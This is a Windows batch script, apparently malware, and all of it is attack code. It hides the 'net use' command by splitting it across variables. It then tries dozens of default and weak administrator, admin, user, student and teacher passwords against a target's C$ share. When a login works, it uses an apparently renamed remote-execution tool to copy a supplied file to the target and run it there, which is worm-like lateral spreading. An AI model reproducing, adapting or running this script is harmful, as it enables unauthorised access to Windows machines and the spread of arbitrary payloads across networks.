@echo off
set F=u
set Z=s
set B=n
set L=e
set U=t
set G=e
set x=if not errorlevel 1 goto
set m=nav
set !=administrator
%B%%L%%U% %F%%Z%%G% \\%1\c$ "xxyyzz" /user:administrator
%x% feeeee29
%B%%L%%U% %F%%Z%%G% \\%1\c$ "abc" /user:admin
%x% feeeee30
%B%%L%%U% %F%%Z%%G% \\%1\c$ "student" /user:student
%x% feeeee31
%B%%L%%U% %F%%Z%%G% \\%1\c$ "teacher" /user:teacher
%x% feeeee32
%B%%L%%U% %F%%Z%%G% \\%1\c$ "" /user:user
%x% feeeee33
%B%%L%%U% %F%%Z%%G% \\%1\c$ "user" /user:user
%x% feeeee34
%B%%L%%U% %F%%Z%%G% \\%1\c$ "test" /user:test
%x% feeeee4
%B%%L%%U% %F%%Z%%G% \\%1\c$ "test123" /user:administrator
%x% feeeee5
%B%%L%%U% %F%%Z%%G% \\%1\c$ "1" /user:administrator
%x% feeeee26
%B%%L%%U% %F%%Z%%G% \\%1\c$ "123" /user:administrator
%x% feeeee27
%B%%L%%U% %F%%Z%%G% \\%1\c$ "12345" /user:admin
%x% feeeee28
%B%%L%%U% %F%%Z%%G% \\%1\c$ "temp" /user:administrator
%x% feeeee6
%B%%L%%U% %F%%Z%%G% \\%1\c$ "" /user:administrator
%x% feeeee1
%B%%L%%U% %F%%Z%%G% \\%1\c$ "" /user:administrator
%x% feeeee35
%B%%L%%U% %F%%Z%%G% \\%1\c$ "Administrator" /user:administrator
%x% feeeee2
%B%%L%%U% %F%%Z%%G% \\%1\c$ "Administrator" /user:administrator
%x% feeeee37
%B%%L%%U% %F%%Z%%G% \\%1\c$ "test" /user:administrator
%x% feeeee3
%B%%L%%U% %F%%Z%%G% \\%1\c$ "admin" /user:administrator
%x% feeeee10
%B%%L%%U% %F%%Z%%G% \\%1\c$ "temp123" /user:administrator
%x% feeeee7
%B%%L%%U% %F%%Z%%G% \\%1\c$ "pass" /user:administrator
%x% feeeee8
%B%%L%%U% %F%%Z%%G% \\%1\c$ "password" /user:administrator
%x% feeeee9
%B%%L%%U% %F%%Z%%G% \\%1\c$ "root" /user:root
%x% feeeee11
%B%%L%%U% %F%%Z%%G% \\%1\c$ "changeme" /user:administrator
%x% feeeee12
%B%%L%%U% %F%%Z%%G% \\%1\c$ "admin" /user:admin
%x% feeeee13
%B%%L%%U% %F%%Z%%G% \\%1\c$ "123456" /user:administrator
%x% feeeee14
%B%%L%%U% %F%%Z%%G% \\%1\c$ "654321" /user:administrator
%x% feeeee15
%B%%L%%U% %F%%Z%%G% \\%1\c$ "abc123" /user:administrator
%x% feeeee16
%B%%L%%U% %F%%Z%%G% \\%1\c$ "12345" /user:administrator
%x% feeeee36
%B%%L%%U% %F%%Z%%G% \\%1\c$ "red123" /user:administrator
%x% feeeee17
%B%%L%%U% %F%%Z%%G% \\%1\c$ "admin123" /user:administrator
%x% feeeee18
%B%%L%%U% %F%%Z%%G% \\%1\c$ "qwerty" /user:administrator
%x% feeeee19
%B%%L%%U% %F%%Z%%G% \\%1\c$ "asdf" /user:administrator
%x% feeeee20
%B%%L%%U% %F%%Z%%G% \\%1\c$ "password123" /user:administrator
%x% feeeee21
%B%%L%%U% %F%%Z%%G% \\%1\c$ "secret" /user:administrator
%x% feeeee22
%B%%L%%U% %F%%Z%%G% \\%1\c$ "qwertyuiop" /user:administrator
%x% feeeee23
%B%%L%%U% %F%%Z%%G% \\%1\c$ "12345" /user:administrator
%x% feeeee24
%B%%L%%U% %F%%Z%%G% \\%1\c$ "54321" /user:administrator
%x% feeeee25
goto feeeeeend
:feeeee1
%m% \\%1 -u %!% -p "" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "" -f -c -d %2 -o
%m% \\%1 -u %!% -p "" -d %2 -o
goto feeeeeend
:feeeee10
%m% \\%1 -u %!% -p "admin" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "admin" -f -c -d %2 -o
%m% \\%1 -u %!% -p "admin" -d %2 -o
goto feeeeeend
:feeeee2
%m% \\%1 -u %!% -p "administrator" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "administrator" -f -c -d %2 -o
%m% \\%1 -u %!% -p "administrator" -d %2 -o
goto feeeeeend
:feeeee37
%m% \\%1 -u %!% -p "Administrator" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "Administrator" -f -c -d %2 -o
%m% \\%1 -u %!% -p "Administrator" -d %2 -o
goto feeeeeend
:feeeee11
%m% \\%1 -u root -p "root" -d attrib.exe -r %2
%m% \\%1 -u root -p "root" -f -c -d %2 -o
%m% \\%1 -u root -p "root" -d %2 -o
goto feeeeeend
:feeeee13
%m% \\%1 -u admin -p "admin" -d attrib.exe -r %2
%m% \\%1 -u admin -p "admin" -f -c -d %2 -o
%m% \\%1 -u admin -p "admin" -d %2 -o
goto feeeeeend
:feeeee3
%m% \\%1 -u %!% -p "test" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "test" -f -c -d %2 -o
%m% \\%1 -u %!% -p "test" -d %2 -o
goto feeeeeend
:feeeee4
%m% \\%1 -u test -p "test" -d attrib.exe -r %2
%m% \\%1 -u test -p "test" -f -c -d %2 -o
%m% \\%1 -u test -p "test" -d %2 -o
goto feeeeeend
:feeeee5
%m% \\%1 -u %!% -p "test123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "test123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "test123" -d %2 -o
goto feeeeeend
:feeeee6
%m% \\%1 -u %!% -p "temp" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "temp" -f -c -d %2 -o
%m% \\%1 -u %!% -p "temp" -d %2 -o
goto feeeeeend
:feeeee7
%m% \\%1 -u %!% -p "temp123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "temp123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "temp123" -d %2 -o
goto feeeeeend
:feeeee8
%m% \\%1 -u %!% -p "pass" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "pass" -f -c -d %2 -o
%m% \\%1 -u %!% -p "pass" -d %2 -o
goto feeeeeend
:feeeee9
%m% \\%1 -u %!% -p "password" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "password" -f -c -d %2 -o
%m% \\%1 -u %!% -p "password" -d %2 -o
goto feeeeeend
:feeeee12
%m% \\%1 -u %!% -p "changeme" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "changeme" -f -c -d %2 -o
%m% \\%1 -u %!% -p "changeme" -d %2 -o
goto feeeeeend
:feeeee14
%m% \\%1 -u %!% -p "123456" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "123456" -f -c -d %2 -o
%m% \\%1 -u %!% -p "123456" -d %2 -o
goto feeeeeend
:feeeee15
%m% \\%1 -u %!% -p "654321" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "654321" -f -c -d %2 -o
%m% \\%1 -u %!% -p "654321" -d %2 -o
goto feeeeeend
:feeeee16
%m% \\%1 -u %!% -p "abc123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "abc123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "abc123" -d %2 -o
goto feeeeeend
:feeeee17
%m% \\%1 -u %!% -p "red123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "red123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "red123" -d %2 -o
goto feeeeeend
:feeeee18
%m% \\%1 -u %!% -p "admin123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "admin123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "admin123" -d %2 -o
goto feeeeeend
:feeeee19
%m% \\%1 -u %!% -p "qwerty" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "qwerty" -f -c -d %2 -o
%m% \\%1 -u %!% -p "qwerty" -d %2 -o
goto feeeeeend
:feeeee20
%m% \\%1 -u %!% -p "asdf" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "asdf" -f -c -d %2 -o
%m% \\%1 -u %!% -p "asdf" -d %2 -o
goto feeeeeend
:feeeee21
%m% \\%1 -u %!% -p "password123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "password123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "password123" -d %2 -o
goto feeeeeend
:feeeee22
%m% \\%1 -u %!% -p "secret" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "secret" -f -c -d %2 -o
%m% \\%1 -u %!% -p "secret" -d %2 -o
goto feeeeeend
:feeeee23
%m% \\%1 -u %!% -p "qwertyuiop" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "qwertyuiop" -f -c -d %2 -o
%m% \\%1 -u %!% -p "qwertyuiop" -d %2 -o
goto feeeeeend
:feeeee24
%m% \\%1 -u %!% -p "12345" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "12345" -f -c -d %2 -o
%m% \\%1 -u %!% -p "12345" -d %2 -o
goto feeeeeend
:feeeee25
%m% \\%1 -u %!% -p "54321" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "54321" -f -c -d %2 -o
%m% \\%1 -u %!% -p "54321" -d %2 -o
goto feeeeeend
:feeeee26
%m% \\%1 -u %!% -p "1" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "1" -f -c -d %2 -o
%m% \\%1 -u %!% -p "1" -d %2 -o
goto feeeeeend
:feeeee27
%m% \\%1 -u %!% -p "123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "123" -d %2 -o
goto feeeeeend
:feeeee28
%m% \\%1 -u admin -p "12345" -d attrib.exe -r %2
%m% \\%1 -u admin -p "12345" -f -c -d %2 -o
%m% \\%1 -u admin -p "12345" -d %2 -o
goto feeeeeend
:feeeee29
%m% \\%1 -u %!% -p "xxyyzz" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "xxyyzz" -f -c -d %2 -o
%m% \\%1 -u %!% -p "xxyyzz" -d %2 -o
goto feeeeeend
:feeeee30
%m% \\%1 -u admin -p "abc" -d attrib.exe -r %2
%m% \\%1 -u admin -p "abc" -f -c -d %2 -o
%m% \\%1 -u admin -p "abc" -d %2 -o
goto feeeeeend
:feeeee31
%m% \\%1 -u student -p "student" -d attrib.exe -r %2
%m% \\%1 -u student -p "student" -f -c -d %2 -o
%m% \\%1 -u student -p "student" -d %2 -o
goto feeeeeend
:feeeee32
%m% \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
%m% \\%1 -u teacher -p "teacher" -f -c -d %2 -o
%m% \\%1 -u teacher -p "teacher" -d %2 -o
goto feeeeeend
:feeeee33
%m% \\%1 -u user -p "" -d attrib.exe -r %2
%m% \\%1 -u user -p "" -f -c -d %2 -o
%m% \\%1 -u user -p "" -d %2 -o
goto feeeeeend
:feeeee34
%m% \\%1 -u user -p "user" -d attrib.exe -r %2
%m% \\%1 -u user -p "user" -f -c -d %2 -o
%m% \\%1 -u user -p "user" -d %2 -o
goto feeeeeend
:feeeee35
%m% \\%1 -u %!% -p "" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "" -f -c -d %2 -o
%m% \\%1 -u %!% -p "" -d %2 -o
goto feeeeeend
:feeeee36
%m% \\%1 -u %!% -p "12345" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "12345" -f -c -d %2 -o
%m% \\%1 -u %!% -p "12345" -d %2 -o
goto feeeeeend
:feeeeeend
